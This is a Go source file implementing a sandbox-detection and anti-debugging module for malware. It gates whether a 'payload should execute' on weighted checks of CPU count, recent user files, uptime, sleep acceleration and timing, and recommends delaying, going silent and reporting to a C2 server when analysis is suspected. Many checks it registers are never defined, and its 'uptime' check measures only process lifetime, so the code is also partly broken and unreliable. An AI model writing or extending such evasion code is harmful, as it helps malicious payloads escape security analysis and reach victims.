package main

import (
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"time"
)

// SandboxDetector detects sandbox and virtual machine environments
type SandboxDetector struct {
	checks    []SandboxCheck
	startTime time.Time
}

// SandboxCheck represents a single detection check
type SandboxCheck struct {
	Name        string
	Description string
	CheckFunc   func() bool
	Weight      int // Higher weight = more suspicious
}

// SandboxResult contains detection results
type SandboxResult struct {
	IsSandbox       bool
	Confidence      int // 0-100
	DetectedChecks  []string
	TotalWeight     int
	Recommendations []string
}

// NewSandboxDetector creates a new sandbox detector
func NewSandboxDetector() *SandboxDetector {
	detector := &SandboxDetector{
		startTime: time.Now(),
	}

	detector.registerChecks()
	return detector
}

// registerChecks registers all sandbox detection checks
func (sd *SandboxDetector) registerChecks() {
	sd.checks = []SandboxCheck{
		{
			Name:        "CPU Cores",
			Description: "Check if CPU cores < 2 (sandbox indicator)",
			CheckFunc:   sd.checkCPUCores,
			Weight:      10,
		},
		{
			Name:        "Memory Size",
			Description: "Check if memory < 4GB (sandbox indicator)",
			CheckFunc:   sd.checkMemorySize,
			Weight:      10,
		},
		{
			Name:        "Disk Size",
			Description: "Check if disk < 60GB (sandbox indicator)",
			CheckFunc:   sd.checkDiskSize,
			Weight:      8,
		},
		{
			Name:        "VM Processes",
			Description: "Check for VM-related processes",
			CheckFunc:   sd.checkVMProcesses,
			Weight:      15,
		},
		{
			Name:        "VM MAC Prefix",
			Description: "Check for VM MAC address prefixes",
			CheckFunc:   sd.checkVMMAC,
			Weight:      12,
		},
		{
			Name:        "Recent Files",
			Description: "Check if recent files < 5 (sandbox indicator)",
			CheckFunc:   sd.checkRecentFiles,
			Weight:      8,
		},
		{
			Name:        "Uptime",
			Description: "Check if uptime < 5 minutes (sandbox indicator)",
			CheckFunc:   sd.checkUptime,
			Weight:      10,
		},
		{
			Name:        "Mouse Movement",
			Description: "Check for lack of mouse movement",
			CheckFunc:   sd.checkMouseMovement,
			Weight:      5,
		},
		{
			Name:        "RDTSC Check",
			Description: "Detect debugger via RDTSC instruction count variance",
			CheckFunc:   sd.checkRDTSC,
			Weight:      15,
		},
		{
			Name:        "Sleep Acceleration",
			Description: "Detect sandbox clock acceleration by measuring actual vs requested sleep",
			CheckFunc:   sd.checkSleepAcceleration,
			Weight:      12,
		},
		{
			Name:        "Human Presence",
			Description: "Detect if active window title changes (human interaction)",
			CheckFunc:   sd.checkHumanPresence,
			Weight:      8,
		},
		{
			Name:        "Hardware Breakpoints",
			Description: "Detect hardware breakpoints via DR register check",
			CheckFunc:   sd.checkHardwareBreakpoints,
			Weight:      18,
		},
		{
			Name:        "VM MAC Address",
			Description: "Detect known VM vendor MAC address prefixes",
			CheckFunc:   sd.checkVMMACEnhanced,
			Weight:      14,
		},
		{
			Name:        "Disk Size Small",
			Description: "VM disks are typically smaller than 100GB",
			CheckFunc:   sd.checkDiskSizeSmall,
			Weight:      10,
		},
		{
			Name:        "RAM Size",
			Description: "VM RAM is typically < 4GB",
			CheckFunc:   sd.checkRAMSizeSmall,
			Weight:      10,
		},
	}
}

// Detect performs all sandbox detection checks
func (sd *SandboxDetector) Detect() *SandboxResult {
	result := &SandboxResult{
		IsSandbox:       false,
		Confidence:      0,
		DetectedChecks:  []string{},
		TotalWeight:     0,
		Recommendations: []string{},
	}

	for _, check := range sd.checks {
		if check.CheckFunc() {
			result.DetectedChecks = append(result.DetectedChecks, check.Name)
			result.TotalWeight += check.Weight
		}
	}

	// Calculate confidence (0-100)
	if result.TotalWeight > 0 {
		result.Confidence = min(100, result.TotalWeight)
		result.IsSandbox = result.Confidence >= 50
	}

	// Generate recommendations
	if result.IsSandbox {
		result.Recommendations = []string{
			"Delay execution for 1-5 minutes",
			"Enter silent mode (no sensitive operations)",
			"Report detection to C2 server",
		}
	}

	return result
}

// checkCPUCores checks if CPU cores are too low
func (sd *SandboxDetector) checkCPUCores() bool {
	return runtime.NumCPU() < 2
}

// checkRecentFiles checks if there are too few recent files
func (sd *SandboxDetector) checkRecentFiles() bool {
	// Check common directories
	home := os.Getenv("USERPROFILE")
	if home == "" {
		home, _ = os.UserHomeDir()
	}
	dirs := []string{
		filepath.Join(home, "Documents"),
		filepath.Join(home, "Desktop"),
		filepath.Join(home, "Downloads"),
	}

	recentCount := 0
	threshold := time.Now().Add(-7 * 24 * time.Hour) // Last 7 days

	for _, dir := range dirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			continue
		}

		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			info, err := entry.Info()
			if err != nil {
				continue
			}

			if info.ModTime().After(threshold) {
				recentCount++
			}
		}
	}

	return recentCount < 5
}

// checkUptime checks if system uptime is too short
func (sd *SandboxDetector) checkUptime() bool {
	uptime := time.Since(sd.startTime)
	return uptime < 5*time.Minute
}

// checkSleepAcceleration detects sleep acceleration used by sandboxes.
func (sd *SandboxDetector) checkSleepAcceleration() bool {
	requested := 200 * time.Millisecond
	start := time.Now()
	time.Sleep(requested)
	elapsed := time.Since(start)
	// If actual sleep is < 50% of requested, sandbox is accelerating time
	return elapsed < requested/2
}

// AntiDebug provides anti-debugging techniques
type AntiDebug struct{}

// NewAntiDebug creates a new anti-debug instance
func NewAntiDebug() *AntiDebug {
	return &AntiDebug{}
}

// DetectTimingAttack detects debugger through timing analysis
func (ad *AntiDebug) DetectTimingAttack() bool {
	// Measure execution time of a simple operation
	// Debuggers slow down execution significantly

	start := time.Now()

	// Perform some computation
	sum := 0
	for i := 0; i < 1000000; i++ {
		sum += i
	}

	elapsed := time.Since(start)

	// If it takes too long, likely being debugged
	// Threshold would need calibration
	return elapsed > 100*time.Millisecond
}

// Evasion provides sandbox evasion techniques
type Evasion struct {
	delayMinutes int
}

// NewEvasion creates a new evasion instance
func NewEvasion(delayMinutes int) *Evasion {
	return &Evasion{
		delayMinutes: delayMinutes,
	}
}

// DelayExecution delays execution by random time
func (e *Evasion) DelayExecution() {
	if e.delayMinutes <= 0 {
		return
	}

	// Random delay between 1 and delayMinutes
	delay := time.Duration(1+int(time.Now().UnixNano())%e.delayMinutes) * time.Minute
	time.Sleep(delay)
}

// WaitForUserInteraction waits for user activity
func (e *Evasion) WaitForUserInteraction(timeout time.Duration) bool {
	// Check for keyboard/mouse activity
	// This would require Windows API calls
	// Placeholder implementation

	time.Sleep(5 * time.Second) // Simulate waiting
	return true
}

// CheckDomain checks if joined to a domain
func (e *Evasion) CheckDomain() bool {
	// Check USERDNSDOMAIN environment variable
	domain := os.Getenv("USERDNSDOMAIN")
	return domain != ""
}

// SandboxCheckResult represents a single check result
type SandboxCheckResult struct {
	Name        string
	Detected    bool
	Confidence  int
	Description string
}

// DetailedDetect returns detailed detection results
func (sd *SandboxDetector) DetailedDetect() []SandboxCheckResult {
	var results []SandboxCheckResult

	for _, check := range sd.checks {
		detected := check.CheckFunc()
		results = append(results, SandboxCheckResult{
			Name:        check.Name,
			Detected:    detected,
			Confidence:  check.Weight * 10,
			Description: check.Description,
		})
	}

	return results
}

// ShouldExecute determines if payload should execute based on checks
func (sd *SandboxDetector) ShouldExecute() bool {
	result := sd.Detect()

	// Only execute if confidence < 50%
	return !result.IsSandbox
}

// GetRecommendations returns evasion recommendations
func (sd *SandboxDetector) GetRecommendations() []string {
	result := sd.Detect()

	if result.IsSandbox {
		return []string{
			"Delay execution for " + strconv.Itoa(sd.checkUptimeInt()) + " minutes",
			"Enter silent mode",
			"Report to C2 server",
		}
	}

	return []string{"Proceed with execution"}
}

func (sd *SandboxDetector) checkUptimeInt() int {
	return int(time.Since(sd.startTime).Minutes())
}

// Helper function
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
